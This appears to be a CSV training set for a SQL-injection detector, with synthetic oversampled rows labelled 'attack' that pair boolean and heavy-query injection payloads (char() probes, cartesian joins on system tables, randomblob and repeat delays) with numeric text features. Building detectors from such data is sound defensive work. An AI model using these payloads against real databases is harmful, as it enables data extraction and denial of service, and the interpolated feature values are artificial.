id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000169,attack,boolean,-7999  )   or 8422  =  1336,nearest_attack_euclidean,R000024,0.15159165738050867,28.008277600922995,14.318403452923057,3.212173594159349,2.159201726461532,12.212268968615373,10.424537937230738,3.2122689686153727,0.07591134574284641,0.43931717467112624,0.371481278821256,0.11329020076477132,0.05306724215384295,0.0,1.0,0.0,0.0,1.0,0.0,1.1061344843076863,0.0,-1.1102230246251565e-16,0.05306724215384295,2.0,0.0530672421538429,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000170,attack,boolean,1'+  (  select bgbq where 1589  =  1589 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   +',nearest_attack_euclidean,R000225,0.9834451788943845,372.0189739890868,31.0,3.297742182441275,92.00632466302895,55.0,173.7579058287862,51.254743497271704,0.24729922620863748,0.14787112162057098,0.46707727631004314,0.1377523758607484,1.5031623315144704,0.0,0.4968376684855295,0.0,0.0,2.0,0.0,35.75158116575724,0.0,-1.1102230246251565e-16,0.0,14.0,0.7515811657572353,0.0,0.2484188342427648,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.751581165757235,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.9999999999999999,17.751581165757234
SMOTE_000171,attack,boolean,"1%""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000248,0.608601765395857,147.74768292020968,30.0,3.9355940860113887,74.74768292020968,8.0,45.0,20.0,0.5059101329828695,0.05414683474160337,0.3045759454215189,0.1353670868540084,0.0,3.9999999999999996,0.0,0.0,1.0,2.0,0.0,6.0,2.0,-1.1102230246251565e-16,2.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.7476829202096762,0.25231707979032386,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000172,attack,boolean,"1   )    )    as aeat where 1007  =  1007 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000058,0.699800619714464,158.50114505492144,31.642366405033673,4.012289678078564,73.78587786498878,18.0,46.71526718993266,20.0,0.46563136128815436,0.11360209922432249,0.29454198479383153,0.12622455469369165,0.21412213501122368,0.0,2.0,0.0,1.0,2.0,0.0,5.785877864988776,0.0,5.0,4.0,5.0,0.21412213501122374,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,0.7858778649887762,0.21412213501122385,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000173,attack,boolean,1  )   and 2006  =  2006,nearest_attack_euclidean,R000215,0.7443540133114142,35.432244358136415,12.078589883297527,2.769187405891664,4.247153929978516,11.494307859957033,16.235769649892575,3.4550129183082703,0.1226977643697654,0.35230653450197325,0.43530381224475634,0.08969188888350509,0.0,0.0,0.0,0.0,0.0,1.2078589883297526,0.0,2.0392949416487633,0.0,-1.1102230246251565e-16,0.2078589883297528,1.2078589883297526,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.2078589883297526,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.2078589883297526
SMOTE_000174,attack,boolean,-7720   )    )    or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   8254  =  8254,nearest_attack_euclidean,R000221,0.013485229207517668,373.0065366376871,29.006536637687066,3.146713123212473,80.04248814496593,57.9901950434694,183.9705851304082,51.00326831884353,0.21458677495662076,0.15546712154586764,0.4932105487921919,0.13673555470531973,0.006536637687065916,0.0,0.9967316811564672,0.0,0.0,2.0,0.0,37.99346336231294,0.0,-1.1102230246251565e-16,0.0,13.003268318843533,0.003268318843532958,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.003268318843533,0.0,0.0032683188435329025,0.0,1.0,0.996731681156467,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.9999999999999999,17.00326831884353
SMOTE_000175,attack,boolean,"1""  )   where 3393  =  3393 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000173,0.21830011059940815,140.31394995693125,33.01163002584125,4.20486819560789,69.0,16.0,39.651159965545,15.66278999138625,0.4918956231608792,0.11406275319672561,0.28244025736985756,0.11160136627253765,0.0,1.0,2.0,0.0,1.0,2.0,0.0,4.66278999138625,0.0,-1.1102230246251565e-16,2.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000176,attack,boolean,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'adsh'  =  'adsh",nearest_attack_euclidean,R000077,1.6289300949482974,228.01112903948393,35.18215542543891,3.7853725082028187,70.95909824342526,26.955388563597268,90.18586510526688,39.910777127194535,0.3090705980046842,0.11914724227766924,0.39622954036507235,0.17555261935257419,4.0,0.0,0.0,0.0,0.0,2.0,0.0,19.54646627631672,0.8178445745610925,1.5910777127194538,3.5910777127194535,10.364310850877814,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.9999999999999999,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.182155425438908,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.182155425438907
SMOTE_000177,attack,boolean,"1'+  (  select wkay where 5476  =  5476 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000161,0.2733653190307995,222.14215593266536,36.80094527849986,3.885859467675623,67.27013268783283,34.80094527849986,86.27013268783281,33.80094527849986,0.302725107476615,0.15671547660214744,0.38835054108811645,0.15220887483312104,1.93364842616662,0.0,0.13270314766675984,0.0,0.0,2.0,0.0,17.86729685233324,0.0,1.0,3.0,10.0,1.0,0.0,0.06635157383337992,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.9999999999999999,0.9336484261666202,0.0,1.0,0.0,0.9336484261666201,0.06635157383337986,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.93364842616662
SMOTE_000178,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000276,0.1519222509346748,81.1532849833912,28.71532849833912,3.8530741925046295,20.57299274750868,20.43065699667824,29.5766424916956,10.57299274750868,0.25444799221345127,0.25222399610672563,0.36322286733952813,0.13010514434029502,2.0,0.0,0.0,0.0,0.0,2.0,0.0,3.7153284983391197,0.0,-1.1102230246251565e-16,0.8576642491695602,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000179,attack,boolean,1'   )    )    as stnn where 6160  =  6160 and 8881  =  7347--,nearest_attack_euclidean,R000187,0.5401146189131377,61.31015468330477,22.14974219449206,3.6101685011703912,14.919793755593645,17.0,22.390360927711118,7.0,0.2440363715911808,0.2773994998315525,0.36434080511721567,0.11422332346005103,1.0,0.0,2.0,0.0,0.0,2.0,0.0,1.770051561101588,0.0,-1.1102230246251565e-16,0.0,4.229948438898412,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.22994843889841177,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.229948438898412
SMOTE_000180,attack,boolean,"1'+  (  select 'tzyz' where 4912  =  4912 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000293,0.04415096531746278,142.92892620091627,39.97157048036651,4.0634582105991015,45.957355720549764,23.0,53.014214759816745,20.957355720549764,0.3215349783519037,0.16092199743482952,0.37092326046443863,0.14661976374882815,4.97157048036651,0.0,2.0,1.0,0.0,2.0,0.0,9.0,0.0,-1.1102230246251565e-16,1.0,5.9857852401832545,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.985785240183255,0.0,1.0,0.0,0.014214759816745137,0.985785240183255,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.9857852401832554
SMOTE_000181,attack,boolean,"1%'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R000126,0.10797100674019841,130.16695175964318,30.0,3.39400169807767,35.10212110632967,12.837923366716225,61.12966130662702,21.097245979970264,0.2683813607182833,0.09908018517411471,0.4703097134703618,0.1622287406372402,4.0,0.0,0.0,0.0,1.0,2.0,0.0,10.0,2.0,0.967584673343245,1.0324153266567548,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0324153266567548,0.967584673343245,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000182,attack,boolean,1'   )    )     )   and 5615  =  5458--,nearest_attack_euclidean,R000074,1.0640805920769583,38.688566746871786,13.0,2.6264689116169575,3.0,9.0,20.0,6.688566746871773,0.07755350860957133,0.23266052582871394,0.5170233907304753,0.17276257483123936,1.0,0.0,1.3771334937435447,0.0,0.0,1.0,0.0,3.0,0.3114332531282277,-1.1102230246251565e-16,0.0,2.3771334937435444,1.0,0.0,0.6885667468717722,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000183,attack,boolean,"1' where 1230  =  1230 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000207,0.034421769626721485,252.41502735618695,38.0,3.830522501942653,76.0,33.415027356186954,100.0,43.0,0.30109836806996826,0.1323612814825915,0.3961820632499582,0.17035828719748203,1.0,0.0,2.0,0.0,0.0,2.0,0.0,22.0,0.0,2.0,4.0,14.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.9999999999999999,0.0,0.0,1.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
SMOTE_000184,attack,boolean,-4684  )   as uqjn where 4550  =  4550 or 1689  =  5825,nearest_attack_euclidean,R000119,0.5920934064277661,57.00536071232928,23.0,3.691495250751303,13.0,20.0,19.504020534246962,4.501340178082321,0.2288399165193995,0.3520614100298454,0.3407286108403047,0.07837006261045036,0.2506700890411604,0.0,1.0,0.0,0.0,2.0,0.0,1.2506700890411597,0.0,-1.1102230246251565e-16,0.0,3.0,0.2506700890411602,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0000000000000004
SMOTE_000185,attack,boolean,"1'  )   as fxuk where 6184  =  6184 and make_set  (  9292  =  2785,2785  )  --",nearest_attack_euclidean,R000131,0.8127012443896854,72.49400924962335,27.03523574979719,3.8438204745240316,16.76462249971027,21.0,25.152924499942053,9.576462249971028,0.22687699422787194,0.2920366480784832,0.3485372525651426,0.1325491051285023,1.0,0.0,2.0,0.0,0.0,2.0,0.0,3.0,0.0,0.576462249971027,1.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0000000000000004
SMOTE_000186,attack,boolean,"1%'   )    )    and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000222,0.5798253056403825,203.71543676331277,30.0,3.531905584741049,104.24423867203747,11.294930788367044,65.0,23.17626730290824,0.5078230326180937,0.055172672555004576,0.32199818783260925,0.11500610699429255,4.0,0.0,0.0,0.0,1.0,2.0,0.0,8.352534605816478,2.0,-1.1102230246251565e-16,5.294930788367043,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000187,attack,boolean,"1   )    )    as kycl where 8008  =  8008 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000045,0.6164089568720384,141.8210448390289,36.471582064388436,3.760100970181902,42.23579103219422,23.0,58.58525380683469,18.0,0.29792410227853244,0.16221323445334626,0.4129131754350677,0.1269494878330536,2.2357910321942183,0.0,2.0,1.0,0.0,2.0,0.0,9.764208967805782,0.0,-1.1102230246251565e-16,1.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,0.23579103219421838,0.7642089678057816,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0000000000000004
SMOTE_000188,attack,boolean,"-2131"" or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""wpsf"" like ""wpsf",nearest_attack_euclidean,R000057,0.09942541657611154,354.67324470472784,31.90713866141685,3.3589839829640242,91.72141598425056,50.1857226771663,162.69646003937362,50.069646003937365,0.25870279790525097,0.14147957392928617,0.45864112649003813,0.14117650167542473,0.0,3.907138661416851,1.0,0.0,0.0,1.023215334645787,0.0,34.13929200787473,0.0,-1.1102230246251565e-16,0.0,12.023215334645787,0.0,0.9767846653542128,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.9999999999999999,17.0
SMOTE_000189,attack,boolean,-7720   )    )    or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   8254  =  8254,nearest_attack_euclidean,R000221,0.6988626595617295,373.33875671885664,29.338756718856676,3.172439492173817,82.2019186725684,57.491864921714985,182.47559476514496,51.169378359428336,0.22015524666566205,0.1540004841902127,0.48878688551298977,0.1370573836311355,0.3387567188566767,0.0,0.8306216405716617,0.0,0.0,2.0,0.0,37.66124328114332,0.0,-1.1102230246251565e-16,0.0,13.16937835942834,0.1693783594283383,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.1693783594283385,0.0,0.16937835942833834,0.0,1.0,0.8306216405716618,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.9999999999999999,17.169378359428336
SMOTE_000190,attack,boolean,"1""  )   where 3393  =  3393 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000173,0.22496780286313164,143.40969005858332,32.35242251464583,4.152340960777949,70.23347880126039,16.0,41.17621125732291,16.0,0.4893869395496848,0.11167075053764784,0.2872715593750195,0.11167075053764784,0.0,1.0,2.0,0.0,1.0,2.0,0.0,5.0,0.0,-1.1102230246251565e-16,2.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,0.08810562866145688,0.911894371338543,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000191,attack,boolean,"1%' or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000099,0.20906391229714943,123.81426824430238,28.0,3.9829104969184597,62.0,10.0,32.34522353691865,19.46904470738373,0.5015544254553689,0.0808958750734466,0.2603208848964199,0.15722881457476456,1.0,0.0,2.0,0.0,1.0,1.0,0.0,4.4690447073837305,1.0,5.0,4.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000192,attack,boolean,"1'  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000201,0.05145584056634334,110.01778278344585,32.03556556689169,3.6851381771598852,32.0,15.0,46.0,17.017782783445845,0.2908624857436308,0.13634179019232695,0.41811482325646937,0.15468090080757277,2.9822172165541545,0.017782783445845496,2.0,1.0,0.0,1.0,0.0,9.0,0.01778278344584522,-1.1102230246251565e-16,1.0,4.0,1.0,0.017782783445845385,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000193,attack,boolean,"-5840'  )   or elt  (  1032  =  1032,3623  )  ",nearest_attack_euclidean,R000279,1.434829700144688,55.46512197548168,21.290698451202047,3.4541002548130844,6.290698451202047,19.441862536538796,22.30232817067349,7.430232817067349,0.11254684107349289,0.35002676632771024,0.4001070653108409,0.13731932728795598,0.5697671829326507,0.0,1.0,0.0,0.0,1.4302328170673493,0.0,3.43023281706735,0.0,-1.1102230246251565e-16,1.0,2.4302328170673495,0.5697671829326507,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.43023281706734934,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.4302328170673495
SMOTE_000194,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000176,1.4221028418455908,153.87387512723222,28.563616225838032,3.7309780335247154,84.20088606312663,9.745535096647876,44.49107019329575,15.436383774161968,0.5397229481900992,0.06310673611943478,0.2940951560689602,0.10307515962150582,0.0,0.0,2.0,0.0,1.0,1.0,0.0,6.0,0.0,-1.1102230246251565e-16,3.745535096647875,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000195,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  'atyf'  =  'atyf",nearest_attack_euclidean,R000244,1.1781697164050164,128.89125531217326,29.302009877173795,4.12346957759677,77.60401975434759,5.302009877173797,31.60401975434759,14.381205926304277,0.6049452019705264,0.0395330088491164,0.24389382172387705,0.11162796745648011,3.460401975434759,0.0,0.0,0.0,1.0,1.460401975434759,0.0,3.4604019754347597,0.0,-1.1102230246251565e-16,2.0,2.4604019754347592,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.4604019754347592,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.460401975434759
SMOTE_000196,attack,boolean,"1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  ",nearest_attack_euclidean,R000203,0.7062204487961267,173.01319881816804,32.65786745455465,3.7367099786826974,51.83553313636134,24.0,68.84873195452937,28.328933727277324,0.29962699874049453,0.13874121607703774,0.3978090942397492,0.16382269094271856,1.4934005909159838,0.0,0.0,0.0,0.0,1.1644668636386613,0.0,15.342132545445356,0.0,1.1644668636386613,2.6710662727226775,7.493400590915984,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.9999999999999999,0.1644668636386613,0.0,0.1644668636386612,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.177665681806694,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.506599409084016
